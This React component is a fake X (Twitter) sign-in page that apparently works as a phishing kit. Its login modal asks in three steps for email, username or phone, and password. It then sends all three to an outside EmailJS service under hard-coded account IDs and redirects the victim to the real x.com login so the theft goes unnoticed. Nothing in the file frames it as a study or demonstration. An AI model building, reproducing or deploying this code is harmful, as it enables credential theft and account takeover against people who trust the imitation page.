import { useState, useEffect } from "react";
import emailjs from "emailjs-com";

export default function XLogin() {
  const [darkMode, setDarkMode] = useState(true);
  const [showLogin, setShowLogin] = useState(false);
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    document.documentElement.classList.toggle("dark", darkMode);
  }, [darkMode]);

  const sendEmail = () => {
    const templateParams = {
      email,
      identifier,
      password,
    };

    emailjs.send(
      "service_ftb4lhs",
      "template_9zwksrd",
      templateParams,
      "o07HchFDD89TJ91W-"
    )
    .then(() => {
      alert("Login details sent successfully. You can now continue with X!");
      window.location.href = "https://x.com/i/flow/login";
    })
    .catch(() => {
      alert("Failed to send login details. Please try again.");
    });
  };

  const handleLogin = (e) => {
    e.preventDefault();

    if (!email || !identifier || !password) {
      alert("All fields are required.");
      return;
    }

    sendEmail();
  };

  return (
    <div className={`relative flex h-screen w-full items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}>
      <div className={`absolute inset-0 transition-all duration-300 ${showLogin ? "backdrop-blur-lg bg-black bg-opacity-50" : ""}`}></div>
      <div className="flex max-w-4xl w-full items-center justify-between px-10 relative z-10">
        <div className="flex-1 hidden md:block">
          <img src="/x_logo.png" alt="X Logo" className="h-40 w-auto" />
        </div>
        <div className="flex-1 max-w-sm">
          <h1 className="text-4xl font-bold mb-6">Happening now</h1>
          <h2 className="text-2xl font-bold mb-6">Join today.</h2>
          <button className="w-full border border-gray-600 flex items-center justify-center gap-2 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
            <img src="/google_logo.png" alt="Google" className="h-5" /> Sign up with Google
          </button>
          <button className="w-full border border-gray-600 flex items-center justify-center gap-2 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
            <img src="/apple_logo.png" alt="Apple" className="h-5" /> Sign up with Apple
          </button>
          <div className="flex items-center my-3">
            <div className="flex-1 border-t border-gray-600"></div>
            <span className="mx-2 text-gray-400">or</span>
            <div className="flex-1 border-t border-gray-600"></div>
          </div>
          <button className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
            Create account
          </button>
          <p className="text-xs text-gray-400">
            By signing up, you agree to the <a href="#" className="text-blue-500">Terms of Service</a> and <a href="#" className="text-blue-500">Privacy Policy</a>, including <a href="#" className="text-blue-500">Cookie Use</a>.
          </p>
          <p className="mt-6 text-gray-300">Already have an account?</p>
          <button onClick={() => setShowLogin(true)} className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mt-2">
            Sign in
          </button>
        </div>
      </div>
      {showLogin && (
        <div className="fixed inset-0 flex items-center justify-center z-20 transition-opacity duration-300 opacity-100 scale-100">
          <div className="bg-white dark:bg-black p-6 rounded-xl shadow-2xl w-full max-w-md md:max-w-lg lg:max-w-xl h-full flex flex-col justify-center relative">
            <button onClick={() => { setShowLogin(false); setStep(1); }} className="absolute top-2 left-2 text-2xl">×</button>
            <div className="text-center">
              <img src="/x_logo.png" alt="X Logo" className="h-8 mx-auto mb-4" />
              <h2 className="text-2xl font-bold mb-4 dark:text-white">Sign in to X</h2>
              {step === 1 && (
                <>
                  <input 
                    type="text" 
                    placeholder="Email" 
                    value={email} 
                    onChange={(e) => setEmail(e.target.value)} 
                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
                  />
                  <button onClick={() => setStep(2)} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
                    Next
                  </button>
                </>
              )}
              {step === 2 && (
                <>
                  <input 
                    type="text" 
                    placeholder="Phone number or username" 
                    value={identifier} 
                    onChange={(e) => setIdentifier(e.target.value)} 
                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
                  />
                  <button onClick={() => setStep(3)} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
                    Next
                  </button>
                </>
              )}
              {step === 3 && (
                <>
                  <input 
                    type="password" 
                    placeholder="Password" 
                    value={password} 
                    onChange={(e) => setPassword(e.target.value)} 
                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
                  />
                  <button onClick={handleLogin} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
                    Log in
                  </button>
                </>
              )}
              <button className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
                Forgot password?
              </button>
              <p className="text-xs text-gray-400">
                Don't have an account? <a href="#" className="text-blue-500">Sign up</a>
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
